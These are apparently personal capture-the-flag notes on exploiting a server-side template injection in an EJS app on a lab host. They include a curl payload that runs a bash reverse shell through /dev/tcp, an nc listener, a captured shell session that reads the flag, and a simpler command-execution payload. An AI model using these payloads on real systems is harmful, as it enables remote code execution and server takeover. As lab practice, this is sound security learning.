- SSTI vulnerability in EJS
- https://github.com/NketiahGodfred/EJS-ssti-exploit
- Can achieve similar RCE for our scenario
- I was on VPN for revshell but can also just cat the flag

```sh
# SSTI
curl -s -X POST http://10.1.50.142/setEmoji -H "Content-Type: application/json" -d '{"emoji": "<%= global.process.mainModule.require(\"child_process\").execSync(\"bash -c \\\"bash -i >& /dev/tcp/IP/PORT 0>&1\\\"\") %>"}'

# Start listener
nc -lvnp PORT

# Trigger payload
curl -s http://10.1.50.142/

# Catch shell
appuser@6fb0deb22c91:/emoji_profile$ ls
flag.txt  node_modules    package-lock.json  package.json  public  server.js  views

appuser@6fb0deb22c91:/emoji_profile$ cat flag.txt
flag{8c8e0e59d1292298b64c625b401e8cfa}
```

OR

```sh
curl -s -X POST http://10.1.50.142/setEmoji -H "Content-Type: application/json" -d '{"emoji": "<%= global.process.mainModule.require(\"child_process\").execSync(\"cat flag.txt\") %>"}'
```

- Reload the page

![[Pasted image 20251101224748.png]]
